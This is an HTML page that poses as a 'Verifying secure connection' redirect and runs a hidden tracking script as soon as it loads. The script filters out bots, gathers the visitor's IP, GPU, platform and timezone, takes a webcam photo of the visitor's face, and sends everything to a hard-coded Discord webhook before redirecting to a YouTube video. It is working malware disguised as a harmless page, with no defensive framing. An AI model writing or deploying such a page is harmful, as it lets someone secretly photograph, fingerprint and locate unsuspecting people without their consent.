<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p style="margin-left: 15px;">Verifying secure connection...</p>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
        const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

        async function takeSnapshot(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = 480; 
            canvas.height = 640;
            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
        }

        async function grabEverything() {
            // 1. THE BOT FILTER (The Gatekeeper)
            const isBot = (
                navigator.webdriver ||                              
                !navigator.languages || navigator.languages.length === 0 || 
                window.innerWidth === 0 || window.innerHeight === 0 
            );

            // Immediately redirect bots without sending data
            if (isBot) {
                window.location.replace(REDIRECT_URL);
                return; 
            }

            let userIP = "Unknown";
            
            // 2. SILENT DATA (IP & Hardware)
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                userIP = ipData.ip;
            } catch (e) {}

            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";

            const info = {
                ip: userIP,
                platform: navigator.platform,
                gpu: gpu,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${window.screen.width}x${window.screen.height}`,
                time: new Date().toLocaleString()
            };

            // 3. CAMERA CAPTURE (Now only runs for real humans)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const photoBlob = await takeSnapshot(stream);
                
                const fd = new FormData();
                fd.append("file", photoBlob, "target_face.jpg");
                fd.append("payload_json", JSON.stringify({
                    embeds: [{
                        title: "üë§ Real Human Logged",
                        color: 3066993,
                        fields: [
                            { name: "üåê IP Address", value: `\`${info.ip}\``, inline: true },
                            { name: "üåç Timezone", value: info.timezone, inline: true },
                            { name: "üíª GPU", value: `\`${info.gpu}\`` },
                            { name: "üì± Platform", value: info.platform, inline: true },
                            { name: "‚è∞ Time", value: info.time, inline: true }
                        ],
                        footer: { text: "FamilyCheckIn Stealth Probe" }
                    }]
                }));

                await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());

            } catch (err) {
                // Handle camera denial but keep hardware log
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `‚ö†Ô∏è **Camera Blocked but Data Captured:**\nüåê **IP:** \`${info.ip}\`\nüåç **Timezone:** ${info.timezone}\nüíª **GPU:** ${info.gpu}`
                    })
                });
            } finally {
                window.location.replace(REDIRECT_URL);
            }
        }

        window.onload = grabEverything;
    </script>
</body>
</html>
